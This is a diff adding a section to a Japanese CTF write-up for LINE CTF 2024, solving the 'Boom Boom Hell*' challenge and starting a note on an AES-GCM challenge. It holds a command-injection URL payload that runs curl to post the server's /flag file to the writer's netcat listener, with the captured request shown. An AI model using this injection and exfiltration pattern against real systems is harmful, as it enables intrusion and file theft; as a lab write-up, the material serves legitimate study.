@@ -3,6 +3,41 @@ Schedule: 2024/03/23 09:00 - 2024/03/24 09:00
 
 <br>
 
+## Boom Boom Hell*
+clientでlistenする
+
+```bash
+nc -l 8000
+```
+
+clientに対してRequestをServerから送信する
+
+```bash
+http://0.0.0.0:3000/chall?url[raw]=$(curl%20${MY_IP_ADDRESS}:${MY_LISTEN_PORT}%20-F=@/flag)
+```
+
+clientにflagが送信される。
+
+```bash
+naoya-ogura@KaliLinux:~/Desktop/ctf-writeup/line-ctf-2024/Boom Boom Hell*/deploy$ nc -l 8000
+POST / HTTP/1.1
+Host: 192.168.1.76:8000
+User-Agent: curl/7.74.0
+Accept: */*
+Content-Length: 198
+Content-Type: multipart/form-data; boundary=------------------------b206e0cf89570dcf
+
+--------------------------b206e0cf89570dcf
+Content-Disposition: form-data; filename="flag"
+Content-Type: application/octet-stream
+
+LINECTF{dummy}
+
+--------------------------b206e0cf89570dcf--
+```
+
+<br>
+
 ## haki-tako-game
 Server接続時に`AES-GCM`で暗号化されたPINコードが与えられる。<br>
 これを復号化するChallenge。
